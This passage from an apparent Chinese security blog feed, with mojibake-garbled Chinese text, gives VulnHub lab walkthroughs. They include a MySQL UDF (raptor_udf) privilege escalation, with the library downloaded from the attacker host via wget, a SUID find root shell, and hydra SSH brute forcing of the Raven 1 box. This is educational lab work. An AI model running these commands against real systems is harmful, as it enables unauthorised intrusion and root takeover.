class="built_in">cp</span> /usr/share/exploitdb/exploits/linux/local/1518.c ./</span><br><span class="line">gcc -g -c 1518.c</span><br><span class="line">gcc -g -shared -o  raptor_udf.so 1518.o -lc</span><br></pre></td></tr></table></figure><blockquote><p>gccå„ä¸ªå‚æ•°è¯´æ˜ï¼š</p><p>-g ç”Ÿæˆè°ƒè¯•ä¿¡æ¯</p><p>-shared ç”ŸæˆåŠ¨æ€é“¾æ¥åº“(.so)è€Œä¸æ˜¯å¯æ‰§è¡Œæ–‡ä»¶ã€‚ç”¨ä»¥åœ¨å„ä¸ªç¨‹åºå…±äº«</p><p>-o è¾“å‡ºæ–‡ä»¶ 1518.oè¾“å…¥æ–‡ä»¶</p><p>-lc è¿æ¥cæ ‡å‡†åº“ï¼Œæä¾›æ ‡å‡†Cåº“å‡½æ•°æ”¯æŒ</p></blockquote><p>åœ¨kaliä¸Šèµ·ä¸€ä¸ªwebæœåŠ¡ï¼Œåœ¨é¶æœºä¸Šä¸‹è½½so</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">python3 -m http.server 8888</span><br><span class="line">æˆ–è€…</span><br><span class="line">python2 -m SimpleHTTPServer 8888</span><br></pre></td></tr></table></figure><p>é¶æœºæ‰§è¡Œï¼š</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget http://192.168.101.128:8888/raptor_udf.so</span><br></pre></td></tr></table></figure><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230628201426533.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230628201426533.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230628201724809.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230628201724809.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>è¿›å…¥æ•°æ®åº“mysqlåˆ›å»ºæ•°æ®è¡¨fooï¼Œå‘è¡¨ä¸­æ’å…¥äºŒè¿›åˆ¶æ•°æ®ï¼Œåˆ©ç”¨dumpfileå‡½æ•°æŠŠæ–‡ä»¶ä»¥rootæƒé™å†™åˆ°pluginç›®å½•ï¼Œæ–°å»ºè¿”å›ç±»å‹ä¸ºæ•´å‹çš„å‡½æ•°do_systemï¼Œåˆ«åsonameï¼ˆæ³¨æ„ä¿®æ”¹load_fileçš„soè·¯å¾„ï¼‰</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">use mysql;</span><br><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> foo(line <span class="type">blob</span>);</span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> foo <span class="keyword">values</span>(load_file(<span class="string">&#x27;/var/www/html/raptor_udf1.so&#x27;</span>));</span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> foo <span class="keyword">into</span> dumpfile <span class="string">&#x27;/usr/lib/raptor_udf2.so&#x27;</span>;</span><br><span class="line"><span class="keyword">create</span> <span class="keyword">function</span> do_system <span class="keyword">returns</span> <span class="type">integer</span> soname <span class="string">&#x27;raptor_udf2.so&#x27;</span>;</span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> foo <span class="keyword">into</span> dumpfile <span class="string">&#x27;/usr/lib/mysql/plugin/raptor_udf2.so&#x27;</span>;</span><br><span class="line"><span class="keyword">create</span> <span class="keyword">function</span> do_system <span class="keyword">returns</span> <span class="type">integer</span> soname <span class="string">&#x27;raptor_udf.so&#x27;</span>;</span><br></pre></td></tr></table></figure><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230628211948175.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230628211948175.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><ul><li>findææƒ</li></ul><p>é€šè¿‡do_systemå‡½æ•°ç»™findç›®å½•æ‰€æœ‰è€…çš„suidæƒé™</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> do_system(<span class="string">&#x27;chmod u+s /usr/bin/find&#x27;</span>);</span><br></pre></td></tr></table></figure><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230628212040242.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230628212040242.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">touch</span> finn</span><br><span class="line">find finn -<span class="built_in">exec</span> <span class="string">&quot;/bin/sh&quot;</span> \;</span><br></pre></td></tr></table></figure><p>å®Œæˆï¼çœ‹åˆ°shellæ ‡è¯†å˜äº†</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230628212226260.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230628212226260.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>uidä¸ºroot</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230628212254283.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230628212254283.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>åœ¨rootä¸‹æ‰¾åˆ°æœ€åä¸€ä¸ªflag:&#x3D;&#x3D;flag4{df2bc5e951d91581467bb9a2a8ff4425}&#x3D;&#x3D;</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230628212404358.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230628212404358.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>]]></content>
      
      
      <categories>
          
          <category> å†…ç½‘æ¸—é€ </category>
          
          <category> é¶æœº </category>
          
      </categories>
      
      
        <tags>
            
            <tag> å†…ç½‘æ¸—é€ </tag>
            
            <tag> vulnhub </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>vulnhubé¶æœºæ¸—é€RAVEN1</title>
      <link href="/2023/06/27/vulnhub-ba-ji-raven1/"/>
      <url>/2023/06/27/vulnhub-ba-ji-raven1/</url>
      
        <content type="html"><![CDATA[<h1 id="Raven-1"><a href="#Raven-1" class="headerlink" title="Raven 1"></a>Raven 1</h1><h2 id="ä¸€ã€æœ‰æ•ˆèµ„äº§æ”¶é›†"><a href="#ä¸€ã€æœ‰æ•ˆèµ„äº§æ”¶é›†" class="headerlink" title="ä¸€ã€æœ‰æ•ˆèµ„äº§æ”¶é›†"></a>ä¸€ã€æœ‰æ•ˆèµ„äº§æ”¶é›†</h2><table><thead><tr><th>èµ„äº§ç¼–å·</th><th>èµ„äº§åˆ†ç±»</th><th>èµ„äº§åç§°</th><th>èµ„äº§è§„æ ¼</th><th>è®¿é—®åœ°å€</th><th>å¤‡æ³¨&#x2F;é—®é¢˜</th></tr></thead><tbody><tr><td>Raven1</td><td>ä¸»æœºç³»ç»Ÿ</td><td>Ubuntuæ“ä½œç³»ç»Ÿ</td><td>Type:Linux<br />IP:192.168.101.135<br />Port:22ã€80ã€111ã€40695</td><td>192.168.101.135</td><td>openSSHç‰ˆæœ¬è¾ƒä½å¯¼è‡´çš„ç”¨æˆ·æšä¸¾å’Œæ ˆæº¢å‡ºï¼Œwordpresså­˜åœ¨æ•æ„Ÿä¿¡æ¯æ³„éœ²</td></tr></tbody></table><p>flagï¼š</p><p>&#x3D;&#x3D;flag1{b9bbcb33e11b80be759c4e844862482d}&#x3D;&#x3D;</p><p>&#x3D;&#x3D;flag2{fc3fd58dcdad9ab23faca6e9a36e581c}&#x3D;&#x3D;</p><p>&#x3D;&#x3D;flag3{afc01ab56b50591e7dccf93122770cd2}&#x3D;&#x3D;</p><p>&#x3D;&#x3D;flag4{715dea6c055b9fe3337544932f2941ce}&#x3D;&#x3D;</p><p>é¶æœºä¸‹è½½åœ°å€ï¼š<a href="https://www.vulnhub.com/entry/raven-1,256/">https://www.vulnhub.com/entry/raven-1,256/</a></p><h2 id="äºŒã€æ¸—é€æµ‹è¯•è¿‡ç¨‹"><a href="#äºŒã€æ¸—é€æµ‹è¯•è¿‡ç¨‹" class="headerlink" title="äºŒã€æ¸—é€æµ‹è¯•è¿‡ç¨‹"></a>äºŒã€æ¸—é€æµ‹è¯•è¿‡ç¨‹</h2><p>kaliæ”»å‡»æœºipä¸º192.168.101.128</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230624215915330.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230624215915330.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><h3 id="1-ä¿¡æ¯æ”¶é›†"><a href="#1-ä¿¡æ¯æ”¶é›†" class="headerlink" title="1. ä¿¡æ¯æ”¶é›†"></a>1. ä¿¡æ¯æ”¶é›†</h3><ul><li>é€šè¿‡netdiscoverè¿›è¡ŒäºŒå±‚å‘ç°ï¼Œå‘ç°åœ°å€ä¸º192.168.101.135ä¸»æœº</li></ul><blockquote><p>å…¶ä»–å‡ ä¸ªä¸»æœºåˆ†åˆ«ä»£è¡¨ï¼š</p><ul><li>192.168.101.1 ç‰©ç†æœº</li><li>192.168.101.2 ç½‘å…³</li><li>192.168.101.254 DHCPæœåŠ¡å™¨</li></ul></blockquote><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netdiscover -r 192.168.101.0/24</span><br></pre></td></tr></table></figure><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230626141708005.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230626141708005.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><ul><li>é€šè¿‡pingè¿›è¡Œä¸‰å±‚å‘ç°ï¼Œæ ¹æ®ttl&#x3D;64åˆæ­¥æ¨æµ‹è¯¥ä¸»æœºä¸ºLinux</li></ul><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ping 192.168.101.135</span><br></pre></td></tr></table></figure><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230626141742326.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230626141742326.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><ul><li>é€šè¿‡masscanå››å±‚å‘ç°ç›®æ ‡ä¸»æœºå¼€æ”¾ç«¯å£</li></ul><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">masscan -p0-65535 --rate=10000 192.168.101.135</span><br></pre></td></tr></table></figure><blockquote><p>masscanï¼šé«˜é€Ÿç«¯å£æ‰«æå·¥å…·ã€‚å‚æ•°å¦‚ä¸‹ï¼š</p><ul><li>-p:æŒ‡å®šè¦æ‰«æçš„ç«¯å£èŒƒå›´ï¼Œå¯ä»¥æ˜¯å•ä¸ªç«¯å£å¦‚-p80,443æˆ–è€…å¤šä¸ªç«¯å£-p1-65535</li><li>â€“rate:æŒ‡å®šæ‰«æé€Ÿç‡ï¼Œå³æ¯ç§’æ‰«æå¤šå°‘ä¸ªç«¯å£ï¼Œé»˜è®¤é€Ÿç‡10000</li><li>-iLï¼šæŒ‡å®šè¦æ‰«æçš„IPåœ°å€åˆ—è¡¨ï¼Œå¯ä»¥æ˜¯ä¸€ä¸ªæ–‡ä»¶ï¼Œä¹Ÿå¯ä»¥æ˜¯ä¸€ä¸ªé€—å·åˆ†éš”çš„IPåœ°å€åˆ—è¡¨</li><li>-oLï¼šæŒ‡å®šè¾“å‡ºæ‰«æç»“æœçš„æ–‡ä»¶åï¼Œå¯ä»¥æ˜¯ä¸€ä¸ªæ–‡ä»¶ï¼Œä¹Ÿå¯ä»¥æ˜¯ä¸€ä¸ªç›®å½•</li></ul></blockquote><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230626142033498.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230626142033498.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>ç›®æ ‡ä¸»æœºå¼€å¯äº†80webæœåŠ¡ç«¯å£ï¼Œ40695ç«¯å£ï¼Œ111ç«¯å£</p><ul><li><p>æ‰«æç›®æ ‡ç«¯å£æœåŠ¡</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -A -p- -sC -T4 -sS -P0 192.168.101.135 -oN nmap.A</span><br></pre></td></tr></table></figure><blockquote><ul><li>-A   ä½¿ç”¨æ“ä½œç³»ç»Ÿæ£€æµ‹ã€ç‰ˆæœ¬æ£€æµ‹ç­‰é€‰é¡¹</li><li>-p-   æ‰«æç›®æ ‡ä¸»æœºæ‰€æœ‰ç«¯å£(1-65535)</li><li>-sC   ä½¿ç”¨é»˜è®¤çš„Nmapè„šæœ¬æ‰«æ</li><li>-T4  è®¾ç½®æ‰«æé€Ÿåº¦ä¸ºâ€å¿«â€</li><li>-sS   ä½¿ç”¨SYNæ‰«æ(åŠå¼€æ”¾æ‰«æ)</li><li>-P0   ç¦ç”¨pingï¼Œä¸è¿›è¡Œä¸»æœºå­˜æ´»æ‰«æ</li><li>-oN nmap.A   å°†æ‰«æç»“æœè¾“å‡ºåˆ°æ–‡ä»¶â€nmap.Aâ€ä¸­ï¼Œæ ¼å¼ä¸ºæ­£å¸¸è¾“å‡º</li></ul></blockquote></li></ul><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230626142129520.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230626142129520.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><ul><li>ç›®æ ‡å¼€å¯äº†ä»¥ä¸‹ç«¯å£åŠæœåŠ¡ï¼š<ul><li>22ç«¯å£ï¼ŒæœåŠ¡ä¸ºOpenSSH 6.7p1;ä¸”ç³»ç»Ÿä¸ºDebian 5 +deb8u4</li><li>80ç«¯å£ï¼ŒæœåŠ¡ä¸ºApacha 2.4.10</li><li>111ç«¯å£ï¼ŒæœåŠ¡ä¸ºrpcbind</li><li>40695ç«¯å£ï¼ŒæœåŠ¡ä¸ºrpc</li></ul></li></ul><p>ä½¿ç”¨Nmapä¸­æ¼æ´åˆ†ç±»NSEè„šæœ¬å¯¹ç›®æ ‡è¿›è¡Œæ¢æµ‹</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sV --script vuln 192.168.101.135</span><br></pre></td></tr></table></figure><hr><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230626142416004.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230626142416004.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>å¯ä»¥çœ‹åˆ°æœ‰å¾ˆå¤šç°æˆçš„CVEå¯ä»¥ç”¨</p><p>å¯¹ç½‘ç«™è¿›è¡ŒæŒ‡çº¹è¯†åˆ«ï¼š</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">whatweb 192.168.101.135</span><br></pre></td></tr></table></figure><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230626142445620.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230626142445620.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>æ²¡æœ‰æœ‰æ•ˆçš„webæœåŠ¡ä¿¡æ¯</p><p>åœ¨exploit-dbä¸Šæœç´¢sshå¯¹åº”ç‰ˆæœ¬çš„æ¼æ´ï¼Œæˆ–è€…searchspolitï¼Œç›®æ ‡æœåŠ¡å™¨çš„opensshæœ‰ç”¨æˆ·åæšä¸¾æ¼æ´</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230625210618990.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230625210618990.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>seebugä¸Šçœ‹åˆ°ç›®æ ‡ä¸»æœºå­˜åœ¨ä¿¡æ¯æ³„éœ²å’Œç¼“å†²åŒºæº¢å‡ºæ¼æ´ï¼Œè¿˜æœ‰2010å¹´çš„æ‹’ç»æœåŠ¡æ¼æ´ï¼ˆå› è¯¥æ¼æ´ç­‰çº§è¾ƒä½ï¼Œå®æ–½æ‹’ç»æœåŠ¡ä¹Ÿè¾ƒå›°éš¾æ‰€ä»¥æ— è§†ï¼‰</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230625214035684.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230625214035684.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230625214249208.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230625214249208.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>&#x3D;&#x3D;192.168.101.135ä¸»æœºçš„22ç«¯å£å­˜åœ¨ä¿¡æ¯æ³„éœ²å’Œç¼“å†²åŒºæº¢å‡ºæ¼æ´ï¼Œseebugè¿˜æœ‰searchspolitéƒ½èƒ½æ‰¾åˆ°å¯¹åº”çš„pocï¼Œè¯¥è½®ä¿¡æ¯æ‰«æå¯ä»¥ç”¨æ¥è¿›è¡Œä¸‹ä¸€æ­¥çš„sshçˆ†ç ´æˆ–æº¢å‡ºæ¼æ´æ”»å‡»ã€‚è¯¥ä¿¡æ¯æ³„éœ²æ¼æ´å®šä¹‰ä¸ºä¸­å±&#x3D;&#x3D;</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230625214826294.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230625214826294.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>è®¿é—®å…¶webæœåŠ¡ï¼š</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230626142536853.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230626142536853.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>åœ¨å…¶service.htmlæºç é‡Œæ‰¾åˆ°flag1:</p><p>&#x3D;&#x3D;flag1{b9bbcb33e11b80be759c4e844862482d}&#x3D;&#x3D;</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230626151243145.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230626151243145.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><ul><li>ç›®å½•æ‰«æï¼š</li></ul><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dirb 192.168.101.135</span><br></pre></td></tr></table></figure><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230626142852924.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230626142852924.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>ç›®æ ‡ç½‘ç«™å­˜åœ¨vendorç›®å½•ï¼Œè®¿é—®ä¸€ä¸‹ï¼Œå‘ç°å­˜åœ¨æ•æ„Ÿç›®å½•éå†</p><blockquote><p>vendorç›®å½•ä¸€èˆ¬æ˜¯æŒ‡åœ¨é¡¹ç›®ä¸­ç”¨äºå­˜æ”¾ç¬¬ä¸‰æ–¹åº“ã€æ¡†æ¶ã€æ’ä»¶ç­‰å¤–éƒ¨ä¾èµ–çš„ç›®å½•ã€‚</p></blockquote><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230626143148450.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230626143148450.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>è¿˜æœ‰wordpressç›®å½•ï¼Œè¯¥ç«™åº”è¯¥æ˜¯ä¸€ä¸ªwordpressçš„æ¡†æ¶</p><ul><li>wappalzeråˆ†æï¼š</li></ul><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230626143024979.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230626143024979.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>åœ¨ç›®å½•å¯ä»¥çœ‹åˆ°ä½¿ç”¨äº†PGPMailer(åŠŸèƒ½é½å…¨çš„PHPç”µå­é‚®ä»¶åˆ›å»ºå’Œä¼ è¾“ç±»)</p><p>VERSIONç›®å½•æ‰¾åˆ°äº†PHPMailerç‰ˆæœ¬å·ä¸º5.2.16</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230626145333475.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230626145333475.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>è¿›å…¥åˆ°BLOGï¼Œçœ‹åˆ°wordpressç½‘ç«™åå°ç™»å½•å…¥å£ï¼š</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230626151644306.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230626151644306.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>ç‚¹å‡»ä¹‹åï¼Œä¼šè·³è½¬åˆ°<code>http://raven.local/wordpress/wp-login.php</code>ã€‚ä½†æ˜¯æ— æ³•è¿æ¥åˆ°raven.localï¼Œè€ƒè™‘æ˜¯dnsè§£æé”™è¯¯ã€‚æ·»åŠ åŸŸååˆ°hostsæ–‡ä»¶</p><ul><li>ç¼–è¾‘hostsæ–‡ä»¶ï¼Œä½¿raven.localè§£æåˆ°é¶æœºipï¼Œå†™å®Œä¹‹åæ¸…é™¤ä¸€ä¸‹dnsç¼“å­˜</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">192.168.101.135 raven.local</span><br></pre></td></tr></table></figure><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ipconfig /flushdns</span><br></pre></td></tr></table></figure><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230626153057034.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230626153057034.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230626153223672.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230626153223672.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><h3 id="2-æ¼æ´æ‰«æ"><a href="#2-æ¼æ´æ‰«æ" class="headerlink" title="2. æ¼æ´æ‰«æ"></a>2. æ¼æ´æ‰«æ</h3><h4 id="WPscanå·¥å…·"><a href="#WPscanå·¥å…·" class="headerlink" title="WPscanå·¥å…·"></a>WPscanå·¥å…·</h4><p>ç”¨WPscanæ¥æ¢æµ‹WordPressçš„æ¼æ´ï¼Œæš´åŠ›æšä¸¾ç”¨æˆ·åï¼š</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wpscan --url http://192.168.101.135/wordpress/ -eu</span><br></pre></td></tr></table></figure><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230626153736259.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230626153736259.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>çˆ†ç ´åˆ°äº†ä¸¤ä¸ªç”¨æˆ·åï¼Œåˆ†åˆ«æ˜¯ï¼š<code>michael</code><code>steven</code></p><h4 id="hydraå·¥å…·æš´åŠ›ç ´è§£"><a href="#hydraå·¥å…·æš´åŠ›ç ´è§£" class="headerlink" title="hydraå·¥å…·æš´åŠ›ç ´è§£"></a>hydraå·¥å…·æš´åŠ›ç ´è§£</h4><p>æŠŠè¿™ä¸¤ä¸ªç”¨æˆ·åå†™å…¥user.txtï¼Œç”¨hydraè¿›è¡Œå¯†ç çˆ†ç ´ç™»å½•SSH:</p><p>kaliæœ¬èº«æœ‰è‡ªå¸¦çš„å¯†ç å­—å…¸ï¼šrockyou</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230626154210867.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230626154210867.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">gzip -d /usr/share/wordlists/rockyou.txt.gz</span><br><span class="line"><span class="built_in">cp</span> /usr/share/wordlists/rockyou.txt pass</span><br><span class="line">hydra -L user.txt -P pass 192.168.101.135 ssh</span><br></pre></td></tr></table></figure><p>sshçš„ç”¨æˆ·michaelå¯†ç ä¸ºmichaelï¼š</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230626154904128.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230626154904128.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><h4 id="å°è¯•è¿›è¡Œsshç™»å½•ï¼š"><a href="#å°è¯•è¿›è¡Œsshç™»å½•ï¼š" class="headerlink" title="å°è¯•è¿›è¡Œsshç™»å½•ï¼š"></a>å°è¯•è¿›è¡Œsshç™»å½•ï¼š</h4><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh michael@192.168.101.135</span><br></pre></td></tr></table></figure><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230626155252966.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230626155252966.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>sshç™»å½•æˆåŠŸï¼Œè·å¾—ä½æƒé™shell</p><h3 id="3-æ¼æ´åˆ©ç”¨"><a href="#3-æ¼æ´åˆ©ç”¨" class="headerlink" title="3. æ¼æ´åˆ©ç”¨"></a>3. æ¼æ´åˆ©ç”¨</h3><ul><li>findå‘½ä»¤å¯»æ‰¾flag2:</li></ul><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -name *flag* 2&gt;/dev/null</span><br></pre></td></tr></table></figure><blockquote><p>è¿™ä¸ªå‘½ä»¤çš„ä½œç”¨æ˜¯åœ¨Linuxç³»ç»Ÿä¸­æŸ¥æ‰¾æ–‡ä»¶åä¸­åŒ…å«â€œflagâ€å­—ç¬¦ä¸²çš„æ–‡ä»¶ï¼Œå¹¶å°†ç»“æœè¾“å‡ºåˆ°æ§åˆ¶å°ã€‚</p><ul><li>ä»æ 